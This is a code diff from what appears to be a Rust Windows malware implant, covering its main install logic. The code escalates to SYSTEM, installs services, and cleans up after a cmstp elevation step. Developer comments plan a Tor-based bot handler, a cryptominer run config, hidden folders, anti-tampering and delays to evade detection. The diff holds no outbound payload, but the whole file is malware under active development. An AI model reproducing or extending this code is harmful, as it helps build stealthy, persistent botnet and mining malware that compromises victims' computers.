@@ -24,6 +24,7 @@ use shared::{
         config::load_mib_config,
         functions::{
             exit_1,
+            exit_1_insta,
             get_current_exe,
             is_running_from_system32,
             try_spawn_program_as_system,
@@ -48,7 +49,7 @@ macro_rules! log_internal {
         {
         match &*$crate::LOGGER.lock().unwrap() {
             Some(logger) => {
-                logger.log($level, s!($s));
+                logger.clone().log($level, s!($s));
                 // println!("{:#?}",$s);
             }
             None => {}
@@ -64,7 +65,7 @@ macro_rules! log_internal {
         {
             match &*$crate::LOGGER.lock().unwrap() {
                 Some(logger) => {
-                logger.log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
+                logger.clone().log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
                 // println!("{}{:#?}", $fmt, $($arg)*);
             }
             None => {}
@@ -200,7 +201,6 @@ fn main() {
         if let Err(error) = start_service() {
             err!("start_service Error: ", error);
         }
-        exit_1()
     } else {
         if is_running_from_system_dir {
             if is_system {
@@ -209,7 +209,6 @@ fn main() {
                 if let Err(error) = install_system_service() {
                     err!("install_system_service Error: ", error);
                 }
-                exit_1();
             } else {
                 tag!("LAUNCH-SYS-SERVICE-INSTALL");
                 if
@@ -220,43 +219,35 @@ fn main() {
                 {
                     err!("try_spawn_program_as_system Error: ", error);
                 }
-                exit_1();
             }
         } else {
             if !mib_config.clean_up_done {
                 tag!("INITIAL-SERVICE-INSTALL");
+                // if we get passed elev arg - means we used elev so then CLEANUP
                 let cmstp_cleanup_handle = thread::spawn(move || {
                     if let Err(error) = try_kill_cmstp() {
                         err!("try_kill_cmstp Error: ", error);
                     }
                 });
+
                 if let Err(error) = install_initial_service() {
                     err!("install_initial_service Error: ", error);
                 }
-
                 let _ = cmstp_cleanup_handle.join();
-                exit_1();
             } else {
                 tag!("NON-SERVICE-WITH-ADMIN-AFTER-CLEAN");
                 warn!("not expected");
-                exit_1();
             }
         }
     }
 }
 
-//? code run config in tor
-//? code post cleanup
-//? in tor handler modify to read data read the first data if exists and other native types sent to not error
-//? sparse out pre install
-//? if cannot connect to tor - run prewritten runconfig ( for miner etc ) still needed
-//? code constant id getting // impl mother board serial and constant ID making and add actual values themselves in the bot handler
-//? in logger setup so that we save last log and if identical - we use (count) that repeats - fix for panic and huuuge bug when sizes get too big from some errors too much | somehow else prevent logger for making TOO BIG logs SIZE
-
-//* code inf cleanup
-//* rewrite everything where we get checks as variables and then each call is just a combination of checks, and they are ordered by the order of how we decide
-
+// move logs elsewhere? idk honestly - after install system
+// hide folders?
+// rewrite everything where we get checks as variables and then each call is just a combination of checks, and they are ordered by the order of how we decide
 // add FULL anti tampering
+
 // improve clean up a little to not look dirty
 // add sleep in between for anti detect
 // fix tor handler logger abomination
+// in logger setup so that we save last log and if identical - we use (count) that repeats AND rewrite logger with thought
